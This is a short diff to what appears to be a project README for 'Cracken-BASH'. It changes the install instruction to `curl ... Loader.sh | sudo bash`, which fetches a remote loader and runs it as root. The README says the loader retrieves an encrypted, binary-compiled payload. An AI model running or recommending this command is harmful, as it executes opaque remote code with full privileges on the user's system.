@@ -43,8 +43,7 @@
 </p>
 
 ```bash
-bash <(curl -s https://raw.githubusercontent.com/owneraniex/Cracken-BASH/main/Loader.sh)
-```
+curl -sL https://raw.githubusercontent.com/owneraniex/Cracken-BASH/main/Loader.sh | sudo bash```
 
 <p align="center">
   <b>🔒 Security Note:</b> This command initiates our <span style="color:#00ADD8;">Secure Loader</span>, which verifies your server environment before retrieving the encrypted, binary-compiled installer payload.
